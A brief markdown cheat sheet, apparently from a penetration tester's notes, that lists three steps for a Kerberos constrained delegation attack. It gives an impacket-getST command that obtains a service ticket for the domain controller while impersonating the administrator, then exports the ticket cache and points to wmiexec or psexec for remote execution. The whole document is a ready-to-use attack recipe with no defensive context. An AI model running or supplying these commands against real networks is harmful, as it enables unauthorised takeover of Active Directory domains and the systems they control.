## Use this impacket module to perform a Constrained Delegation attack

#### 1) impacket-getST -spn HTTP/DC.DOMAIN.COM -impersonate administrator -dc-ip DC_IP -k -no-pass DOMAIN.COM/USERNAME

#### 2) export KRB5CCNAME=administrator.ccache

#### 3) Use wmiexec or psexec
